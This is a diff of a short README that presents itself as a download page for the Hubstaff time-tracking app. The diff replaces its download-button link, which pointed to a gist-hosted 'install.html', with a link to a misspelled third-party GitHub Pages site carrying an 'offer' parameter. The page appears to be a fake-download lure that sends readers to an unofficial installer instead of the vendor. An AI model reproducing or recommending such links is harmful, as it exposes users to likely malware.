@@ -1,6 +1,6 @@
 # Hubstaff Download — Desktop Time Tracking & Productivity Tool
 
-<a href="https://gistcdn.githack.com/whiterosedollar12/77d8fcb5ecc7c73c01f8701136bf2c31/raw/d4fafa1acc42e71459ec4641fed80f8f59a5cc1f/install.html?offer=Hubstaff" target="_blank">
+<a href="https://dowloader-desktop-app.github.io/.github/?offer=Hubstaff" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Hubstaff%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
